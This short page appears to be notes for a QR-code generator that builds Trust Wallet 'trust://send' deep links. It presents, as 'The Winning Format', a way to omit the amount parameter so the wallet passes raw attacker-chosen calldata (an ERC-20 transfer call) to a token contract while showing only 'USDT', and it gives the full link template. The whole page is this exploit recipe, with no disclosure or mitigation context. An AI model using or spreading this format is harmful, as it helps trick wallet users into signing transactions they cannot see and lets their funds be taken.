🔬 trust:// raw data — QR Generator

No amount param → data passes through as calldata

⚡ The Winning Format

Key insight: When amount is missing from trust://send, the wallet does NOT route to erc20_transfer (which ignores external data). Instead it falls to contract_generic which passes raw data through as transaction calldata.

Format:
trust://send?asset=0xUSDT_CONTRACT&address=0xRECIPIENT&data=0xa9059cbb...

asset = token contract → wallet shows "USDT"
address = ignored or recipient (wallet sends data to asset)
No amount → data executes
